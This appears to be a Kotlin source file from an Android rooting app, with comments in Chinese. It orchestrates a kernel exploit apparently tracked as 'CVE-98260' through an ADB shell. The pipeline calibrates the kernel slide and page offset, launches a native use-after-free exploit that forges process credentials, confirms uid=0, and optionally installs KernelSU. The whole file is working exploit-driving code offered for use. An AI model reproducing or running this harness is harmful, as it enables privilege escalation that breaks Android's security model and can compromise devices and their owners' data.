package org.supass.ai_su_pass.cve98260

import android.os.SystemClock
import java.util.ArrayDeque
import org.supass.ai_su_pass.core.adb.AdbShellChannel
import org.supass.ai_su_pass.core.bridge.cve98260_native.Cve98260Chunk
import org.supass.ai_su_pass.core.bridge.cve98260_native.Cve98260Request
import org.supass.ai_su_pass.core.bridge.cve98260_native.Cve98260StageEvent
import org.supass.ai_su_pass.core.shell.ShellResult

/** 流水线五个阶段的阶段码，与 Pigeon `events.stage` 逐字一致。 */
internal object Cve98260Stage {
    const val CALIB_A = "calib_a"
    const val CALIB_B = "calib_b"
    const val INJECT = "inject"
    const val VERIFY = "verify"
    const val KSU = "ksu"

    val ORDERED = listOf(CALIB_A, CALIB_B, INJECT, VERIFY, KSU)
}

/** 阶段状态码，与 Pigeon `events.status` 逐字一致。 */
internal object Cve98260Status {
    const val RUNNING = "running"
    const val OK = "ok"
    const val DEGRADED = "degraded"
    const val FAILED = "failed"
    const val SKIPPED = "skipped"
}

/** 阶段命令不设时限：`0` 交给 [AdbShellChannel] 表示不限时，由用户手动取消。 */
private const val STAGE_TIMEOUT_MS = 0L
private const val CANCEL_TIMEOUT_MS = 10_000L
private const val SETUP_TIMEOUT_MS = 5_000L
private const val READ_TIMEOUT_MS = 5_000L

/** 注入成功后等 rootd 就绪的上限；超时判失败，不去动设备侧进程。 */
private const val INJECT_WAIT_MS = 300_000L
private const val INJECT_POLL_MS = 800L

/** 主进程已退出但 socket 还没出现时的宽限：child fork rootd 后才 ack，存在毫秒级窗口。 */
private const val INJECT_GONE_GRACE_MS = 10_000L

private const val EXIT_CALIB_A = 2
private const val EXIT_CALIB_B = 3
private const val EXIT_INJECT = 4
private const val EXIT_VERIFY = 5

private const val WORK_DIR = "/data/local/tmp/cve98260"
private const val RESULT_SLIDE = "slide.txt"
private const val RESULT_PAGE_OFFSET = "page_offset.txt"
private const val RESULT_PAGE_OFFSET_SCORE = "page_offset.score"
private const val INJECT_PROFILE = "exploit-profile.bin"
private const val INJECT_LOG = "exploit.log"

/** rootd 自报就绪；见 pc98260_rootd.c。 */
private const val ROOTD_READY = "C98260_ROOTD_READY=1"

/** 轮询用的行内标记，不属于原生输出。 */
private const val MARK_SOCKET = "__C98260_SOCKET_UP__"
private const val MARK_DEAD = "__C98260_PROC_GONE__"

/** 注入失败后原生会 pause() 常驻，提前用它收尾，别等到超时。 */
private val INJECT_FAILURE_MARKS = listOf(
    "[uaf] missed page",
    "cred escalation not effective",
    "binding failed",
)

/**
 * 一次 GhostKey 运行的五阶段编排。
 *
 * 阶段串行、判定只在本类；Dart 只调 `start` / `poll` / `cancel`。
 * 所有命令都经 [channel] 的 raw shell 通道执行，stdin 二进制安全。
 */
internal class Cve98260Session(
    private val request: Cve98260Request,
    private val binPath: String,
    private val profileBlob: ByteArray,
    private val ksudPath: String,
    private val channel: AdbShellChannel,
) {

    val sessionId: String = "cve98260-${System.currentTimeMillis()}"

    private val startedAt: Long = SystemClock.elapsedRealtime()

    private val roundId: Long = System.currentTimeMillis()

    private val socketPath: String = "$WORK_DIR/pc98260-$roundId.sock"

    private val stopFilePath: String = "$WORK_DIR/pc98260-$roundId.stop"

    /** 注入阶段专用：profile 落盘给后台进程读，日志落盘给本侧增量读。 */
    private val injectProfilePath: String = "$WORK_DIR/$INJECT_PROFILE"

    private val injectLogPath: String = "$WORK_DIR/$INJECT_LOG"

    private val lock = Any()

    private val pendingEvents = ArrayDeque<Cve98260StageEvent>()

    private val logBuffer = StringBuilder()

    @Volatile
    private var finished = false

    @Volatile
    private var exitCode = -1

    @Volatile
    private var timedOut = false

    @Volatile
    private var failure = ""

    @Volatile
    private var cancelled = false

    private var slide = ""

    private var pageOffset = ""

    /** 308 B blob 的短名。 */
    private val blob: ByteArray get() = profileBlob

    fun start() {
        Thread({ runPipeline() }, "cve98260-session").apply {
            isDaemon = true
            start()
        }
    }

    /** 增量取走事件与输出；取走即清空。 */
    fun poll(): Cve98260Chunk = synchronized(lock) {
        val events = ArrayList<Cve98260StageEvent>(pendingEvents)
        pendingEvents.clear()
        val log = logBuffer.toString()
        logBuffer.setLength(0)
        Cve98260Chunk(
            sessionId = sessionId,
            events = events,
            log = log,
            finished = finished,
            exitCode = exitCode.toLong(),
            timedOut = timedOut,
            durationMs = SystemClock.elapsedRealtime() - startedAt,
            failure = failure,
        )
    }

    /**
     * 取消：停止本侧判定并让 rootd 优雅退出。
     *
     * 不对注入进程发任何信号——它们钉住的页里有伪造 cred。
     */
    fun cancel() {
        cancelled = true
        synchronized(lock) {
            timedOut = true
            finished = true
            exitCode = -1
        }
        Thread({
            runCatching { exec(cmd("$binPath rootd-stop"), CANCEL_TIMEOUT_MS, null) }
        }, "cve98260-cancel").apply {
            isDaemon = true
            start()
        }
    }

    private fun runPipeline() {
        try {
            exec("mkdir -p $WORK_DIR", SETUP_TIMEOUT_MS, null)
            var code = runCalibA()
            if (cancelled) return
            if (code != 0) {
                finish(code)
                return
            }
            code = runCalibB()
            if (cancelled) return
            if (code != 0) {
                finish(code)
                return
            }
            code = runInject()
            if (cancelled) return
            if (code != 0) {
                finish(code)
                return
            }
            code = runVerify()
            if (cancelled) return
            if (code != 0) {
                finish(code)
                return
            }
            runKsu()
            finish(0)
        } catch (t: Throwable) {
            synchronized(lock) {
                failure = t.javaClass.simpleName
                exitCode = -1
                finished = true
            }
        }
    }

    private fun runCalibA(): Int {
        emit(Cve98260Stage.CALIB_A, Cve98260Status.RUNNING)
        val r = exec(cmd("$binPath calibrate-a"), STAGE_TIMEOUT_MS, blob)
        append(r)
        val text = readText(RESULT_SLIDE)
        if (text.isNullOrEmpty()) {
            emit(Cve98260Stage.CALIB_A, Cve98260Status.FAILED)
            return EXIT_CALIB_A
        }
        slide = text
        emit(Cve98260Stage.CALIB_A, Cve98260Status.OK)
        return 0
    }

    private fun runCalibB(): Int {
        emit(Cve98260Stage.CALIB_B, Cve98260Status.RUNNING)
        val r = exec(
            cmd("$binPath calibrate-b --slide $slide"),
            STAGE_TIMEOUT_MS,
            blob,
        )
        append(r)
        val offset = readText(RESULT_PAGE_OFFSET)
        if (offset.isNullOrEmpty()) {
            emit(Cve98260Stage.CALIB_B, Cve98260Status.FAILED)
            return EXIT_CALIB_B
        }
        pageOffset = offset
        val score = readText(RESULT_PAGE_OFFSET_SCORE).orEmpty()
        if (score.contains("fallback", ignoreCase = true)) {
            if (!request.acceptFallbackPageOffset) {
                emit(Cve98260Stage.CALIB_B, Cve98260Status.FAILED)
                return EXIT_CALIB_B
            }
            emit(Cve98260Stage.CALIB_B, Cve98260Status.DEGRADED)
            return 0
        }
        emit(Cve98260Stage.CALIB_B, Cve98260Status.OK)
        return 0
    }

    private fun runInject(): Int {
        emit(Cve98260Stage.INJECT, Cve98260Status.RUNNING)
        // 后台启动后 stdin 管道就断了，profile 先落盘，让子命令从文件读。
        val staged = exec("cat > $injectProfilePath", SETUP_TIMEOUT_MS, blob)
        if (staged.timedOut || staged.exitCode != 0) {
            append(staged)
            emit(Cve98260Stage.INJECT, Cve98260Status.FAILED)
            return EXIT_INJECT
        }
        exec("rm -f $injectLogPath $socketPath", SETUP_TIMEOUT_MS, null)

        // 只负责拉起，不等退出：成功时主进程自行退出、cred 子进程常驻钉页；
        // 失败时原生 pause() 永不返回，阻塞等待就必然卡死。
        val launch = exec(
            cmd(
                "$binPath exploit --slide $slide --page-offset $pageOffset " +
                    "--daemon-exit < $injectProfilePath > $injectLogPath 2>&1 & echo \$!",
            ),
            SETUP_TIMEOUT_MS,
            null,
        )
        // `echo $!` 的 stdout 只是 pid，不进日志；stderr 若有内容才是启动失败的原因。
        if (launch.stderr.isNotEmpty()) append(launch)
        val pid = launch.stdout.lineSequence().lastOrNull()?.trim()?.toIntOrNull() ?: -1

        val deadline = SystemClock.elapsedRealtime() + INJECT_WAIT_MS
        var goneAt = 0L
        var offset = 0
        while (SystemClock.elapsedRealtime() < deadline) {
            if (cancelled) {
                emit(Cve98260Stage.INJECT, Cve98260Status.FAILED)
                return EXIT_INJECT
            }
            val polled = pollInject(pid, offset)
            offset = polled.logSize
            if (polled.text.isNotEmpty()) {
                appendText(polled.text)
                if (INJECT_FAILURE_MARKS.any { polled.text.contains(it) }) {
                    emit(Cve98260Stage.INJECT, Cve98260Status.FAILED)
                    return EXIT_INJECT
                }
            }
            if (polled.socketReady) {
                emit(Cve98260Stage.INJECT, Cve98260Status.OK)
                return 0
            }
            val now = SystemClock.elapsedRealtime()
            if (polled.processGone) {
                if (goneAt == 0L) goneAt = now
                // 主进程退出时 rootd 可能还没 bind 完，给一段宽限再判死。
                if (now - goneAt > INJECT_GONE_GRACE_MS) {
                    appendText("[inject] exploit exited before rootd was ready\n")
                    emit(Cve98260Stage.INJECT, Cve98260Status.FAILED)
                    return EXIT_INJECT
                }
            } else {
                goneAt = 0L
            }
            Thread.sleep(INJECT_POLL_MS)
        }
        appendText("[inject] rootd not ready in ${INJECT_WAIT_MS / 1000}s, giving up\n")
        emit(Cve98260Stage.INJECT, Cve98260Status.FAILED)
        return EXIT_INJECT
    }

    /**
     * 一次注入轮询：取日志增量 + 看 socket 是否就绪 + 看主进程是否已消失。
     *
     * 偏移量取自 `wc -c` 的真实字节数，而不是把读回的行拼起来算长度——
     * 后者会因为换行/标记行的增删导致游标漂移，日志就会重复或丢行。
     */
    private fun pollInject(pid: Int, offset: Int): InjectPoll {
        val pidCheck = if (pid > 0) "test -d /proc/$pid || echo $MARK_DEAD; " else ""
        val state = exec(
            "test -S $socketPath && echo $MARK_SOCKET; " +
                pidCheck +
                "wc -c < $injectLogPath 2>/dev/null",
            READ_TIMEOUT_MS,
            null,
        )
        val socketReady = state.stdout.contains(MARK_SOCKET)
        val processGone = pid > 0 && state.stdout.contains(MARK_DEAD)
        val logSize = state.stdout.lineSequence()
            .map { it.trim() }
            .lastOrNull { it.isNotEmpty() && it.all(Char::isDigit) }
            ?.toIntOrNull() ?: offset
        val text = if (logSize > offset) {
            exec("tail -c +${offset + 1} $injectLogPath 2>/dev/null", READ_TIMEOUT_MS, null).stdout
        } else {
            ""
        }
        return InjectPoll(
            text = text,
            logSize = logSize,
            socketReady = socketReady || text.contains(ROOTD_READY),
            processGone = processGone,
        )
    }

    private fun runVerify(): Int {
        emit(Cve98260Stage.VERIFY, Cve98260Status.RUNNING)
        val r = exec(cmd("$binPath su -c id"), STAGE_TIMEOUT_MS, null)
        append(r)
        if (!r.stdout.contains("uid=0")) {
            emit(Cve98260Stage.VERIFY, Cve98260Status.FAILED)
            return EXIT_VERIFY
        }
        emit(Cve98260Stage.VERIFY, Cve98260Status.OK)
        return 0
    }

    /** KSU 接管。只在 verify 成功后被调用；失败不影响会话级退出码。 */
    private fun runKsu(): Int {
        if (!request.runKsu) {
            emit(Cve98260Stage.KSU, Cve98260Status.SKIPPED)
            return 0
        }
        emit(Cve98260Stage.KSU, Cve98260Status.RUNNING)
        if (ksudPath.isEmpty()) {
            synchronized(lock) {
                logBuffer.append("[ksu] no ksud available: 选中的管理器里没有可用的 ksud\n")
            }
            emit(Cve98260Stage.KSU, Cve98260Status.FAILED)
            return 0
        }
        val r = exec(cmd("$binPath ksu-takeover"), STAGE_TIMEOUT_MS, blob)
        append(r)
        emit(
            Cve98260Stage.KSU,
            if (r.exitCode == 0) Cve98260Status.OK else Cve98260Status.FAILED,
        )
        return 0
    }

    private fun finish(code: Int) {
        synchronized(lock) {
            if (cancelled) return
            exitCode = code
            finished = true
        }
    }

    private fun emit(stage: String, status: String) {
        if (cancelled) return
        synchronized(lock) {
            pendingEvents.addLast(Cve98260StageEvent(stage = stage, status = status))
        }
    }

    private fun append(r: ShellResult) {
        synchronized(lock) {
            if (r.stdout.isNotEmpty()) logBuffer.append(r.stdout)
            if (r.stderr.isNotEmpty()) logBuffer.append(r.stderr)
        }
    }

    private fun appendText(text: String) {
        synchronized(lock) { logBuffer.append(text) }
    }

    private fun readText(name: String): String? {
        val r = exec("cat $WORK_DIR/$name", READ_TIMEOUT_MS, null)
        val text = r.stdout.trim()
        return text.ifEmpty { null }
    }

    private fun exec(command: String, timeoutMs: Long, stdin: ByteArray?): ShellResult =
        channel.exec(command, timeoutMs, stdin)

    private fun cmd(argv: String): String = envPrefix() + argv

    /** 上游 `baseEnv()` 的 8 项，写成一条 shell 前缀。 */
    private fun envPrefix(): String = buildString {
        append("cd $WORK_DIR && ")
        append("CVE98260_HOME=$WORK_DIR ")
        append("TMPDIR=/data/local/tmp ")
        append("HOME=/data/local/tmp ")
        append("PATH=/sbin:/system/sbin:/system/bin:/system/xbin ")
        append("PLANT_FAST=1 ")
        append("PC98260_SOCK=$socketPath ")
        append("PC98260_STOP_FILE=$stopFilePath ")
        append("CVE98260_SLIDE=$slide ")
        append("CVE98260_KSUD=$ksudPath ")
        append("CVE98260_KSU_LOG=$WORK_DIR/ksud.log ")
    }
}

/** 一次注入轮询的结果：日志增量、日志文件当前字节数、就绪/退出标志。 */
private class InjectPoll(
    val text: String,
    val logSize: Int,
    val socketReady: Boolean,
    val processGone: Boolean,
)
